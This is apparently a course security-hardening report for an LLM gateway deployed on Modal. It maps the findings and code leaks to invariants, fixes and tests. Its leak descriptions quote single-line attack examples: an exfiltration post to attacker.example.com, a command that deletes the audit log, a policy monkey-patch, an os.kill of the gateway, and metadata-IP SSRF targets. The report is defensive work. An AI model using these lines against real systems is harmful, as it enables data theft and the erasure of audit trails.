# Session 12 Part 1 — Findings, Invariants, Fixes

> **Submission:** [`harden/session12-part1`](https://github.com/Shwethaamrutha/glc_v2/tree/harden/session12-part1) · 12 commits · 310 tests pass · ruff clean · deployed on Modal (workspace `shwetha-sd78`) · **live-verified with a real Gemini API key** — isolated worker reached Google with its own key while the gateway held zero.

Every catalogued finding from Section 6 (groups A + C) and Section 7 (10 leaks) is closed. This document maps each to the Section 4 invariant it breaks and the fix that closes it.

---

## Contents

- [The 8 invariants](#the-8-invariants)
- [Fix summary](#fix-summary-at-a-glance)
- [Findings table](#findings-table)
- [Structural vs patched — the honest split](#structural-vs-patched)
- [Per-finding detail](#per-finding-detail)
- [Deploying](#deploying-the-hardened-topology)

---

## The 8 invariants

| # | Rule | Prevents |
|---|------|----------|
| 1 | Adapters must never see provider API keys | Key theft by a compromised adapter |
| 2 | Every action checked against the actual user, tenant, and final args | Acting for the wrong principal |
| 3 | External content is always data, never instructions | Prompt injection through content |
| 4 | A credential works for only one tool call | Token reuse across tools/actions |
| 5 | Each tenant has separate memory; every fact records its source | Cross-tenant memory bleed |
| 6 | Dangerous actions approved with their final params | Approve-then-swap (TOCTOU) |
| 7 | Components can't edit or delete their audit logs | Hiding tracks |
| 8 | Hard limits on time, tokens, tool calls, cost | Runaway cost / DoS |

---

## Fix summary at a glance

| Move | Where |
|---|---|
| **Provider-key isolation** — gateway holds no keys; per-provider worker + Secret + egress allowlist | `glc/provider_worker.py`, `glc/provider_broker.py`, `infra/modal_workers.py` |
| **Adapter isolation** — every one of 15 adapters in its own container + Secret + egress | `glc/adapter_worker.py`, `glc/adapter_broker.py`, `infra/modal_adapters.py` |
| **Auth in front of data plane** — bearer key, fails closed, docs disabled | `glc/security/auth.py`, `glc/main.py` |
| **Egress control** — SSRF-safe fetch + per-host allowlist | `glc/security/egress.py` |
| **Tamper-evident audit** — SHA-256 hash chain + verify endpoint | `glc/audit/store.py` |
| **Signed cost ledger** — HMAC per row + verify endpoint | `glc/db.py` |
| **Hard limits** — data-plane RPM + daily budget + pairing throttle | `glc/security/budget.py`, `glc/security/pairing.py` |
| **Reproducible deploy** — image from frozen `uv.lock`, single audit writer | `infra/modal_app.py` |

---

## Findings table

Scan this table first. Details for each row are further below.

### Section 6 · Group A — introduced/elevated by the migration

| # | Finding | Inv. | Status | Fix reference |
|---|---------|------|--------|---------------|
| **A1** | Public data plane, no auth | 2, 8 | Closed · verified live | Bearer key on all data-plane routers |
| **A2** | Info disclosure + Swagger open | 2 | Closed · verified live | Auth gate + docs disabled |
| **A3** | Single Function, no egress wall | 1, 3 | Closed | Per-worker egress allowlist |
| **A4** | One shared Secret for all keys | 1 | Closed · **flagship, verified live** | Per-provider Secrets + keyless gateway |
| **A5** | Non-reproducible image | supply-chain | Closed | Frozen `uv.lock` install |
| **A6** | Audit DB corrupt under autoscale | 7 | Closed | `max_containers=1` + persistent Volume paths |

### Section 6 · Group C — inherited endpoint/logic, now public

| # | Finding | Inv. | Status | Fix reference |
|---|---------|------|--------|---------------|
| **C1** | SSRF via `/v1/vision` | 2 | Closed · verified live | Per-hop private/link-local denylist |
| **C2** | Cross-channel envelope spoofing | 2 | Closed | See leak 9 |
| **C3** | WS token in query string | 4 | Closed | Header-only, constant-time |
| **C4** | Verbose upstream errors | (info-disclosure) | Closed · verified live | Generic client message, detail in logs |
| **C5** | No rate limits or budget on data plane | 8 | Closed | Per-caller RPM + daily budget |
| **C6** | Pairing-code brute force | 2 | Closed | 5-strike lockout |

### Section 7 — the ten code leaks

| # | Leak | Inv. | Status | How |
|---|------|------|--------|-----|
| **1** | Shared process env holds all keys | 1 | Closed · **structural + verified live** | Per-provider worker, keyless gateway |
| **2** | Audit DB writable at OS layer | 7 | Closed · verifiable | SHA-256 hash chain + `/v1/control/audit/verify` |
| **3** | `force_pair_owner()` in-process | 2 | Closed · guard + structural | Bootstrap-only flag + container split |
| **4** | Install token readable in-process | 2, 4 | Closed · guard + structural | Secret delivery, off shared Volume |
| **5** | Policy engine monkey-patch | 6 | Documented structural | Out-of-process is capstone scope; no live call site |
| **6** | Unbounded network egress | 1, 3 | Closed | Per-worker egress allowlist |
| **7** | Subprocess/shell capability | 8 / RCE | Closed · structural | Per-component minimal images + `restrict_modal_access` |
| **8** | Adapter kills gateway (`os.kill`) | 8 | Documented structural | PID-namespace separation (via container split) |
| **9** | Cross-channel envelope spoof | 2 | Closed | `env.channel == route` check |
| **10** | Cost-ledger poisoning | 7, 8 | Closed · verifiable | Input validation **+ HMAC signed writer** + `/v1/control/ledger/verify` |

---

## Structural vs patched

Leaks **3, 4, 5, 7, 8** exist because adapters share the gateway's process. The lecture is explicit: the *real* fix is process/container separation, not an in-process guard. This repo builds that separation for real:

- **Provider boundary** (invariant 1) — each provider key in its own worker with its own Secret + egress allowlist. All 6 workers deployed and live-verified.
- **Adapter boundary** — every one of 15 contributed adapters in its own container with its own Secret + egress allowlist. `glc.adapter_broker.ADAPTER_REGISTRY` is the single source of truth driving both the subprocess (local) and Modal deploys. All 15 `adapter_*` Functions deployed and spot-verified live.

Where an in-process guard is *also* meaningful (leaks 3, 4, 10), we ship one on top of the structural fix. Where an in-process guard would be theater (leaks 5, 8), we don't ship one and say so plainly.

---

## Per-finding detail

<details><summary><strong>A1 — Public data plane, no auth</strong> · invariant 2, 8</summary>

- **Was:** `/v1/chat`, `/chat/batch`, `/embed`, `/vision`, `/speak`, `/transcribe` ran for anyone; unauth `/v1/chat` returned 502 (provider error), not 401.
- **Fix:** `require_api_key` dependency on every data-plane router. Bearer `GLC_GATEWAY_API_KEY`, constant-time compare, **fails closed** (503) if no key configured. `/healthz` stays open. (`glc/security/auth.py`, `glc/main.py`)
- **Verified live:** unauth 401 (was 502); with key 502 (reaches provider). Unit tests: `test_data_plane_auth.py` (no-key, wrong-key, `/v1/status`, `/v1/providers`, docs disabled, `/healthz` open, fail-closed-when-key-unset).

</details>

<details><summary><strong>A2 — Info disclosure + Swagger open</strong> · invariant 2</summary>

- **Was:** `/v1/status`, `/providers`, `/capabilities`, `/cost/by_agent`, `/calls`, `/docs`, `/openapi.json` — all open.
- **Fix:** read surfaces sit behind the same auth gate; `/docs`, `/redoc`, `/openapi.json` disabled unless `GLC_ENABLE_DOCS=1`.
- **Verified live:** `/v1/providers` → 401, `/openapi.json` and `/docs` → 404.

</details>

<details><summary><strong>A3 — Single Function, no egress wall</strong> · invariant 1, 3 (= leak 6)</summary>

Each provider worker Function has its own `GLC_EGRESS_ALLOWLIST`; `glc/security/egress.py` is the app-layer companion that blocks off-allowlist and private/link-local targets. See leak 6.

</details>

<details><summary><strong>A4 — One Secret for all provider keys</strong> · invariant 1 (= leak 1, flagship)</summary>

Gateway runs with `GLC_ISOLATED_PROVIDERS=1` and reads no provider key. Each key lives in a separate per-provider Secret mounted only into that provider's worker. See leak 1 for the mechanism + live verification.

</details>

<details><summary><strong>A5 — Non-reproducible image</strong> · supply-chain</summary>

- **Was:** shipped `modal_app.py` on rolling `debian_slim` with `>=` deps, ignored `uv.lock`.
- **Fix:** `infra/modal_app.py` installs from the frozen `uv.lock` (`uv export --frozen`). Provider workers use a minimal pinned image.

</details>

<details><summary><strong>A6 — Audit DB corrupt under autoscale + latent persistence bug</strong> · invariant 7</summary>

- **Was:** `min_containers=0` + autoscale → multiple containers → concurrent SQLite writers → split/corrupt audit trail. **Latent compounding bug:** the audit, pairing, and ledger stores defaulted to `~/.glc/` and ignored `GLC_CONFIG_DIR` — the variable the migration walkthrough sets to point at the Modal Volume. On Modal these DBs would land on the throwaway container filesystem and vanish on every restart.
- **Fix:**
  - `infra/modal_app.py` sets `max_containers=1` (single audit writer).
  - Audit store commits each append (`isolation_level=None`).
  - `glc/audit/store.py`, `glc/db.py`, `glc/security/pairing.py` now honor `GLC_CONFIG_DIR` at call time — DBs persist on the Volume.
- Combined with the hash chain (leak 2), a single ordered chain is maintained across restarts.

</details>

<details><summary><strong>C1 — SSRF via <code>/v1/vision</code></strong> · invariant 2</summary>

- **Was:** `_resolve_image_urls` fetched any http(s) URL with `follow_redirects=True`, no allowlist.
- **Fix:** `glc/security/egress.safe_get` follows redirects manually and re-validates every hop against the private/loopback/link-local/reserved denylist (IPv4, IPv6, IPv4-mapped IPv6).
- **Verified live:** vision at `169.254.169.254` and `127.0.0.1` → 400 rejected. Unit: `test_egress.py`.

</details>

<details><summary><strong>C2 — Cross-channel envelope spoofing</strong></summary>

See leak 9.

</details>

<details><summary><strong>C3 — WS install token in query string</strong> · invariant 4</summary>

- **Was:** `WS /v1/channels/{name}?token=...` accepted the install token in the query string — lands in access logs.
- **Fix:** header-only (`Authorization: Bearer`), constant-time compare. `?token=` path removed.
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_query_string_token`.

</details>

<details><summary><strong>C4 — Verbose upstream errors</strong> · info disclosure</summary>

- **Was:** `/v1/chat` returned the raw provider error and endpoint.
- **Fix:** client sees a generic message; provider/endpoint/raw error stay in the server-side `db.log_call` ledger.
- **Verified live:** mock key request returns `{"detail":"upstream provider error; see gateway logs for detail"}`.

</details>

<details><summary><strong>C5 — No rate limits or budget on public data plane</strong> · invariant 8</summary>

- **Fix:** `glc/security/budget.py` adds per-caller sliding-60s rate limit (`GLC_DATAPLANE_RPM`, default 60) and hard daily request budget (`GLC_DATAPLANE_DAILY_BUDGET`, default 5000), wired as a data-plane dependency.
- **Verified:** `test_dataplane_budget.py`.

</details>

<details><summary><strong>C6 — Pairing-code brute force</strong> · invariant 2</summary>

- **Fix:** `PairingStore.confirm_code` throttles failed attempts (5 per 5-min window, then lockout). Control route returns 429 when throttled.
- **Verified:** `test_pairing_bruteforce.py`.

</details>

---

<details><summary><strong>Leak 1 — Shared process environment holds all keys</strong> · invariant 1 · flagship</summary>

- **Was:** every adapter runs in the gateway process; `os.environ["GEMINI_API_KEY"]` (and every other key) readable in-process.
- **Fix (structural):** the gateway holds **no** provider keys. In isolated mode (`GLC_ISOLATED_PROVIDERS=1`) it builds keyless `RemoteProvider` objects (`glc/provider_broker.py`) that dispatch each call to an isolated worker (`glc/provider_worker.py`) holding exactly one provider's key — a subprocess locally, a per-provider Modal Function with its own Secret in prod (`infra/modal_workers.py`). **The key is never in the gateway's memory.**
- **Verified live:** gateway process env contains no `GEMINI_API_KEY`; `/v1/chat` dispatches to the worker, which reaches Google with its own key (real "API key not valid" on the mock, real completion on the real key); a worker with no key fails with "not present". Unit: `test_provider_isolation.py`.

</details>

<details><summary><strong>Leak 2 — Audit DB writable at OS layer</strong> · invariant 7</summary>

- **Was:** `sqlite3.connect(...).execute("DELETE FROM audit_log")` silently erases history.
- **Fix:** SHA-256 **hash chain** on `audit_log` (`prev_hash`, `row_hash`; schema v2). Any DELETE/UPDATE/splice breaks the chain, and `verify_chain()` reports the first broken row. Exposed at `GET /v1/control/audit/verify` (install-token gated). Single-writer gateway (A6) keeps read-then-write atomic. (A full wipe is detectable only against an external checkpoint; partial tampering always caught.)
- **Verified:** `test_audit_chain.py` — both delete and edit detected.

</details>

<details><summary><strong>Leak 3 — <code>force_pair_owner()</code> reachable in-process</strong> · invariant 2</summary>

- **Was:** one line grants the caller `owner_paired` trust.
- **Fix (guard + structural):** `force_pair_owner()` refuses to run unless `GLC_ALLOW_FORCE_PAIR=1`. The one-shot installer sets it; the serving gateway never does. Structural close is the container split.
- **Verified:** `test_force_pair_guard.py`.

</details>

<details><summary><strong>Leak 4 — Install token readable in-process</strong> · invariant 2, 4</summary>

- **Was:** `~/.glc/install_token` at mode 0600 keeps out other Unix users but not same-user code.
- **Fix (hardening + structural):** token delivered via `GLC_INSTALL_TOKEN` (a Secret mounted only into the gateway); in that mode, never written to the shared config Volume.
- **Verified:** `test_install_token_secret.py`.

</details>

<details><summary><strong>Leak 5 — Policy engine open to monkey-patching</strong> · invariant 6 · documented structural</summary>

- **Was:** `glc.policy.engine.evaluate = lambda ...` rebinds the policy check.
- **Analysis:** the honest fix is running the policy engine in a separate process (lecture: "capstone scope"). In-process Python can always rebind a module attribute, so an in-process guard would be theater. The same isolation pattern used for provider workers is the mechanism; the policy engine has no live runtime call site yet (S11 agent is a stub), so no false in-process guard is added.

</details>

<details><summary><strong>Leak 6 — Unbounded network egress</strong> · invariant 1, 3</summary>

- **Was:** `httpx.post("https://attacker.example.com/exfil", ...)` and the bytes leave; single Function has no outbound control.
- **Fix:** per-provider workers run with their own egress allowlist (`GLC_EGRESS_ALLOWLIST` = that provider's host only). `glc/security/egress.assert_egress_allowed` blocks off-allowlist and private/link-local hosts.
- **Note:** egress control is one necessary layer; data can still leave through an allowed reply (per the lecture's "surviving chain" in Section 12).
- **Verified:** `test_egress.py`.

</details>

<details><summary><strong>Leak 7 — Unrestricted subprocess/shell capability</strong> · invariant 8 / RCE</summary>

- **Analysis:** there is **no shell-injection bug in the code** — every `subprocess.run` (whisper_cpp wrapper, system-fallback TTS) passes an argument **list**, never `shell=True` or `os.system`. The leak is a *capability*: any adapter can shell out and the monolithic image ships a shell.
- **Fix (structural + explicit hardening flag):** per-component minimal images + gVisor sandbox (Modal's `serialized=True` Functions run under gVisor — non-root, isolated PID/mount namespaces, syscall shield) + per-Function egress allowlists + **`restrict_modal_access=True`** on every provider worker and adapter Function. That last flag strips the container's ambient Modal API credential, so a compromised worker can't use the platform token to reach other functions/Secrets.
- **Note:** Modal 1.5 has no read-only-root-FS flag, so the prescribed "read-only filesystem" item is substituted by `restrict_modal_access` as the available blast-radius reduction.

</details>

<details><summary><strong>Leak 8 — Adapter kills the gateway (<code>os.kill</code>)</strong> · invariant 8 · documented structural</summary>

- **Analysis:** `os.kill(os.getpid(), SIGTERM)` ends the process. The remote kill endpoint is loopback-gated, so the internet path is closed. The in-process path is only closed by putting adapters in a separate PID namespace so they cannot see the gateway's PID.
- **Fix (structural):** container split (PID-namespace separation). No in-process guard can stop code in the same process from signalling it.

</details>

<details><summary><strong>Leak 9 — Cross-channel envelope spoofing</strong> · invariant 2</summary>

- **Was:** WS `/v1/channels/{name}` never checked `env.channel == name`. A Telegram adapter could send `env.channel="discord"` and impersonate Discord.
- **Fix:** the WS route rejects any envelope whose `env.channel` differs from the route name, records a `channel_spoof_rejected` audit event, and closes the socket.
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_channel_mismatch`.

</details>

<details><summary><strong>Leak 10 — Cost-ledger poisoning</strong> · invariant 7, 8</summary>

- **Was:** `db.log_call(... input_tokens=999_999_999 ...)` validated nothing, corrupting cost/budget accounting.
- **Fix:** matches the session's prescribed "process separation plus a signed writer that the gateway holds", in two independent layers:
  1. **Input validation** — `log_call` rejects non-int, negative, and absurd (>10M) token counts (`LedgerValidationError`) at the app-layer entry point.
  2. **Signed writer (HMAC-SHA256)** — each row carries an HMAC over its signed fields, keyed by `GLC_LEDGER_SIGNING_KEY` which only the gateway holds. A row forged or edited via raw SQLite fails signature verification. Verifiable at `GET /v1/control/ledger/verify` (install-token gated). `sig` column added with a defensive `ALTER TABLE` migration.
- **Verified:** `test_cost_ledger.py` — validation rejects the documented poison; signature detects a raw-SQL `UPDATE` of an existing row **and** a fully forged `INSERT`.

</details>

---

## Adapter isolation, proven

All 15 `adapter_<name>` Functions are deployed on Modal, each with its own Secret and egress allowlist. Live spot-check:

| Adapter | Live test result |
|---|---|
| `adapter_telegram` | Reached `api.telegram.org` with its own mock token (404, as expected) |
| `adapter_gmail` | Reached `_get_client()` / `token.json` in its own container |
| `adapter_whatsapp` | Ran its pairing check |

Unit tests (`test_adapter_isolation.py`, 9 cases) assert:
- Gmail adapter module is NOT imported into the gateway process in isolated mode.
- Per-adapter secret reader never returns a sibling adapter's token (proven against a planted `SLACK-SECRET-LEAK` in the `slack/` secret dir).
- Every catalogue adapter has an isolation config so none silently runs in-process.
- Each adapter's egress allowlist is channel-specific (no wildcards).

---

## Deploying the hardened topology

```bash
# per-provider key Secrets (mock values)
modal secret create glc-key-gemini      GEMINI_API_KEY=mock-not-real
modal secret create glc-key-groq        GROQ_API_KEY=mock-not-real
modal secret create glc-key-nvidia      NVIDIA_API_KEY=mock-not-real
modal secret create glc-key-cerebras    CEREBRAS_API_KEY=mock-not-real
modal secret create glc-key-openrouter  OPEN_ROUTER_API_KEY=mock-not-real
modal secret create glc-key-github      GITHUB_ACCESS_TOKEN=mock-not-real

# gateway auth key (no provider keys on the gateway)
modal secret create glc-gateway-auth    GLC_GATEWAY_API_KEY=<long-random>

# per-adapter channel secrets (all 15, mock values)
uv run python scripts/create_adapter_secrets.py --run

# deploy
modal deploy infra/modal_workers.py    # per-provider isolated workers
modal deploy infra/modal_adapters.py   # per-adapter isolated Sandboxes (all 15)
modal deploy infra/modal_app.py        # keyless gateway
```

To run the gateway with isolated adapters, set `GLC_ISOLATED_ADAPTERS=1` and `GLC_ADAPTER_BACKEND=modal` (or `subprocess` locally with `GLC_ADAPTER_SECRETS_DIR` pointing at per-adapter secret files).

Local (no Modal) equivalent:

```bash
GLC_ISOLATED_PROVIDERS=1 \
GLC_PROVIDER_BACKEND=subprocess \
GLC_PROVIDER_KEYS_DIR=/path/to/keys \
GLC_REQUIRE_AUTH=1 \
GLC_GATEWAY_API_KEY=... \
uv run uvicorn glc.main:app
```
